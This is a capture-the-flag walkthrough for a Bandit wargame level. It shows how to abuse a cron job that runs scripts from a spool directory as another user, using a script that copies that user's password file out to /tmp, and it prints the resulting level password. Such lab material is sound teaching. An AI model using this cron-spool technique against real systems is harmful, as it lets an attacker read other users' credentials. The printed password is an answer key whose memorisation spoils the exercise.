# Bandit Level 23 --> Level 24
## Level Goal
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Commands you may need to solve this level
cron, crontab, crontab(5) (use “man 5 crontab” to access this)

## Solution

change dir to /etc/cron.d then see its content
```console
bandit23@bandit:~$ cd  /etc/cron.d/ 
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root
```

Open cronjob_bandit24 to see the command
```console
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```
```console
bandit23@bandit:/etc/cron.d$ cat bandit24 /usr/bin/cronjob_bandit24.sh
cat: bandit24: No such file or directory
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
Make bash script copy bandit24 pass in tmp dir 
```console
bandit23@bandit:/etc/cron.d$ mkdir /tmp/bandlev23
bandit23@bandit:/etc/cron.d$ cd /tmp/bandlev23
bandit23@bandit:/tmp/bandlev23$ chmod 777 /tmp/bandlev23
bandit23@bandit:/tmp/bandlev23$ nano script.sh
```
bash script
```sh
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/bandlev23/pass.txt
echo "pass copied"
```

Copy your script (after make it executable) to /var/spool to execute as mention in cron
```console
bandit23@bandit:/tmp/bandlev23$ chmod 777 script.sh
bandit23@bandit:/tmp/bandlev23$ cp script.sh /var/spool/bandit24
```
Wait 60s then
```console
bandit23@bandit:/tmp/bandlev23$ ls
pass.txt  script.sh
bandit23@bandit:/tmp/bandlev23$ cat pass.txt 
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```
## Password
> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

  
